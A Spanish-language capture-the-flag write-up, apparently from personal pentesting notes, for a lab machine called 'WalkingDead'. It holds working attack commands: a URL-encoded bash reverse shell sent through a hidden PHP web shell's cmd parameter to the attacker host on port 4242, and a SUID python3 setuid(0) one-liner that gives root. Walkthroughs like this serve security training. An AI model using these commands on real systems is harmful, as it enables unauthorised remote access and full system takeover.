# WalkingDead

### Fase de Reconocimiento y Descubrimiento (Enumeración)

#### Escaneo de Puertos (Nmap)

Iniciamos un escaneo de puertos inicial con nmap para identificar los servicios activos en la máquina objetivo:

![Pasted image 20260705111418.png](<../../../.gitbook/assets/Pasted image 20260705111418.png>)

**Servicios identificados:**

* **Puerto 22/TCP (SSH):** Puerto abierto para control remoto. Ver teoría en [SSH.md](<../../../Pentesting Notes/1_Enumeration/SSH.md>).
* **Puerto 80/TCP (HTTP):** Servidor web expuesto. Ver teoría en [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>).

***

### Enumeración Web

#### Inspección del Servidor Web (WhatWeb)

Analizamos las tecnologías del servidor web mediante whatweb:

![Pasted image 20260705111518.png](<../../../.gitbook/assets/Pasted image 20260705111518.png>)

whatweb no expone tecnologías o frameworks vulnerables. Accedemos al sitio web a través del navegador:

![Pasted image 20260705183854.png](<../../../.gitbook/assets/Pasted image 20260705183854.png>)

* **Hallazgo:** Al revisar el código fuente de la página de inicio, localizamos un enlace oculto que apunta a `/hidden/.shell.php`.

#### Fuzzing de Directorios

Antes de interactuar con el archivo encontrado, realizamos un fuzzing de directorios para descartar otros recursos expuestos:

![Pasted image 20260705184150.png](<../../../.gitbook/assets/Pasted image 20260705184150.png>)

* **Hallazgo:** Descubrimos un archivo llamado `backup.txt` que se encuentra vacío, por lo que centramos nuestra atención en la ruta `/hidden/.shell.php`.

***

### Fase de Explotación / Intrusión

#### Ejecución Remota de Comandos (RCE) y Reverse Shell

Al interactuar con el archivo `/hidden/.shell.php`, realizamos pruebas de paso de parámetros GET y detectamos que el parámetro `cmd` permite ejecutar comandos del sistema directamente en la máquina víctima:

![Pasted image 20260705185039.png](<../../../.gitbook/assets/Pasted image 20260705185039.png>)

Utilizamos el parámetro `cmd` para inyectar una reverse shell con codificación URL (URL encoding) dirigida a nuestra máquina atacante en el puerto 4242:

```
http://172.17.0.2/hidden/.shell.php?cmd=/bin/bash%20-c%20%27/bin/bash%20-i%20%3E%26%20/dev/tcp/172.17.0.1/4242%200%3E%261%27
```

Recibimos la conexión y realizamos el tratamiento clásico de la TTY para obtener una consola completamente interactiva y estable (evitando perder la sesión con CTRL+C):

```bash
script /dev/null -c bash
# (Presionar CTRL+Z para suspender la shell)
stty raw -echo; fg
reset xterm
export TERM=xterm && export SHELL=bash
```

Obtenemos acceso como el usuario de bajos privilegios `www-data`.

***

### Escalada de Privilegios

#### Enumeración de Binarios SUID

Listamos todos los binarios del sistema que cuentan con el bit SUID activo:

```bash
find / -perm -4000 -type f 2>/dev/null
```

![Pasted image 20260705190241.png](<../../../.gitbook/assets/Pasted image 20260705190241.png>)

* **Vulnerabilidad de Configuración:** Detectamos que el binario `/usr/bin/python3.8` tiene el bit SUID habilitado. Ver teoría en [Permissions.md](<../../../Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions.md>).

#### Explotación de SUID (Python3)

Haciendo uso de la capacidad de Python para interactuar con las APIs del sistema operativo, ejecutamos un comando one-liner para alterar el ID de usuario al del superusuario (root) y spawnear una shell interactiva:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

¡Elevamos privilegios con éxito convirtiéndonos en el usuario root!

***

### Relaciones y Conceptos

* **Teoría:** [Linux Privilege Escalation - Permissions.md](<../../../Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions.md>), [SSH.md](<../../../Pentesting Notes/1_Enumeration/SSH.md>), [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>)
* **Laboratorios Relacionados:** [Patriaquerida](Patriaquerida.md) (Comparte exactamente la misma escalada por Python SUID)
